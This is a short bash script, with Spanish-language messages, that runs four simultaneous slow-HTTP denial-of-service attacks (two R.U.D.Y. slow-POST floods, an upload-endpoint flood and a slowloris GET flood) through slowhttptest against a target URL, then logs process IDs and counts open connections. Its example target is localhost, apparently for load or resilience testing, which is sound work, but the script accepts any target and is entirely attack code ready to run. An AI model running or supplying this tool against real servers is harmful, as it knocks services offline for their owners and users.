#!/bin/bash

TARGET="$1"
# 10 minutos
DURATION="$2"
OUTPUT_DIR="./rudy_$TARGET_$(date +%Y%m%d_%H%M%S)"

if [[ -z "$TARGET" || -z  "$DURATION" ]]; then
    echo "Use: rudy_attack.sh <TARGET> <DURATION (sec)>"
    echo "Example: rudy_attack.sh http://127.0.0.1:8000 600"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] INICIANDO ATAQUE R.U.D.Y.?"
echo "Target: $TARGET"
echo "Duración: $DURATION segundos"
echo "Resultados: $OUTPUT_DIR"
echo ""

start_attack() {
    local name=$1
    local cmd=$2
    echo "Iniciando $name..."
    $cmd > "$OUTPUT_DIR/${name}.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$OUTPUT_DIR/${name}.pid"
    echo "PID: $pid"
}

start_attack "form_rudy_1" "slowhttptest -c 1000 -B -i 80 -r 200 -s 32768 -t POST -u ${TARGET}/form/ -x 20 -p 3 -l $DURATION"
start_attack "form_rudy_2" "slowhttptest -c 800 -B -i 120 -r 150 -s 16384 -t POST -u ${TARGET}/form/ -x 15 -p 3 -l $DURATION"
start_attack "upload_rudy" "slowhttptest -c 700 -B -i 90 -r 120 -s 65536 -t POST -u ${TARGET}/upload/ -x 25 -p 3 -l $DURATION"
start_attack "slowloris" "slowhttptest -c 600 -H -t GET -u ${TARGET}/form/ -x 15 -p 3 -l $DURATION"

echo ""
echo "[+] Ataque iniciado"
echo "Monitoreando..."

# Monitoreo
for i in {1..10}; do
    echo "Tiempo: $(date)"
    echo "Conexiones activas: $(netstat -an | grep 8000 | grep ESTABLISHED | wc -l)"
    sleep 5
done

echo "Ataques en ejecución por $DURATION segundos..."
wait

echo "[+] ATAQUE FINALIZADO"
